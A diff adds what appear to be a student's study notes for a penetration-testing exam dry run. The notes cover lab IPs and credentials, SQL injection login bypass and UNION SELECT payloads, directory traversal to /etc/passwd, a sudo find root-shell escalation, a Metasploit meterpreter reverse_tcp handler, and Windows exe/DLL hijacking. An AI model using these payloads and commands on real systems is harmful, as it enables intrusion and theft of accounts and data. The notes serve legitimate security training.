@@ -1,0 +1,230 @@
+DryRun Notes
+
+
+
+Part 1: Exploitation and Enumeration
+
+Part 2: Priv esclatation
+
+Saving the buffer overflow ones for last
+
+Make notes pretty. 
+
+Target
+	10.50.35.10	
+	
+Credz
+
+user 2:EaglesIsARE78
+user3:Bob4THEEapples
+Aaron:apasswordyPa$$word
+Lroth:anotherpassword4THEages
+
+
+IPs
+	192.168.28.181 WebApp
+	192.168.28.172
+	192.168.28.179
+
+
+nmap -Pn -T4 -sT <ip> -p 22,80,8080,8888,4444,4242,2222 2>/dev/null
+
+nc <ip> <port>
+	banner grab first to make sure
+
+nmap -Pn -T4 -sT <ip> --script http_enum.nse
+nikto -h <ip>
+	run both of them
+
+firefox because we have nothing on ssh
+	type in the ip
+
+If you see a wall of text view the page source, you may see a link
+check for a robots.txt
+
+Just browse and find a way to get to the back end of it
+	sign in page is a possible SQL
+
+
+=======================================================================================
+http://10.50.35.10/login.html
+	put the url in notes to make it easier to go back to it
+'or 1='1 
+	in both fields
+show inspect 
+	go to network 	
+		reload, click first post method
+			go to request, click raw
+				copy it and paste it in url after the .php
+example	10.50.35.10/login.php?username=%27or+1%3D%271&passwd=%27or+1%3D%271
+	You need the ? 
+		Get passwords and usernames you may need to decode with rot13
+
+
+=======================================================================================
+possible directory traversal in the career box
+http://10.50.35.10/getcareers.php?myfile=Executive_Assistant.html
+	file to read is directory traversy
+		you can do ../../../../../../../etc/passwd and /etc/hosts
+			last resort to attack it doesnt get you much
+
+
+=======================================================================================
+possible upload
+	http://10.50.35.10/apply.html
+If you can get webshell or command injection, IMMEDIATELY do ssh keygen
+check /upload and /uploads
+	if not a webpage then there is nothing to upload
+
+
+=======================================================================================
+Get on machine with found credz
+
+	whoami && hostname
+	bash
+	sudo -l
+	find / -type f -perm /2000 2>/dev/null
+	ip -a
+	ip neigh
+	ip route
+	cat /etc/hosts
+	ping sweep command
+		if ttl is 64 it is a router
+
+========================================================================================
+
+linops machine
+
+	make your tunnels and scan the ips found
+	
+	find 181 has 80 and 22 open
+		nc 192.168.28.181 80
+make tunnel to http port
+	go on firefox and get to it
+		http://127.0.0.1:2000/pick.php?product=1 OR 1=1
+			change the first 1 and increment by one until you find 				vulnerable one
+http://127.0.0.1:2000/pick.php?product=7 Union Select 1,2,3;#
+	remember the order they appear in for later 
+
+http://127.0.0.1:2000/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+
+http://127.0.0.1:2000/pick.php?product=7 UNION SELECT user_id,username,name FROM siteusers.users
+	found passwords and usernames
+		encoded most likely (rot13)
+
+
+
+
+
+	find 172 has 22
+		sudo -l ---> you find you have sudo perms for find 
+			sudo find . -exec /bin/sh \; -quit
+				check /root directory
+ROOTS HOME DIRECTORY IS JUST /root not all users are in /home
+
+ss -ntlp
+cat /etc/hosts
+
+if these ports are open its windows
+	445,3389,9999
+
+proxychains nc 192.168.28.179 9999
+	we find out it is secure server
+
+we make msfconsole
+	use multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost 0.0.0.0
+	set lport 4444
+	run
+
+make sure we have tunnel set up to 9999 
+inside windows_demo.py script in windows_exploit dir we change the port number to the tunnel port we made
+
+python windows_demo.py
+
+boom done
+
+
+
+if quad 9999 isnt open this is the other method
+
+look at services
+	sort by description
+		its gonna be obvious or blank
+			click on it find the path and navigate to it
+
+if we get a dll its dll hijacking
+if we get an exe its exe replacement
+
+notional exe replacement
+	rename the current exe
+		look at c code already
+			name the exe we made into the original name of the exe given
+		replace it and then restart the box, minimum is three restarts
+
+
+view file name extensions
+view hidden items
+
+
+
+
+========================================================================================
+TEST TALK
+
+
+test is organized into individual techniques 
+	the question name will be named after the hostname of the machine
+		second number is student number, doesnt matter for ctfd questions
+
+Everything that was on the dryrun
+
+Binary Analysis (reverse engineering)
+	exploit development
+
+Linux Exploitation
+	GTFObins
+	
+Reconnaissance
+
+SQL Injection
+	Golden Statement (ton of points)
+
+
+Web Exploitation
+	ssh-keygen
+	
+
+
+ZERO CROSS SITE SCRIPTING
+	
+
+
+windows exploitation
+	identify vuln services (services)
+	dll hijacking or exe replacement
+		pay attention it will be given to us
+
+
+
+
+
+
+
+
+31 questions
+
+16 question on part 1
+
+15 questions on part 2
+
+
+
+
+
+
+
+
+
+
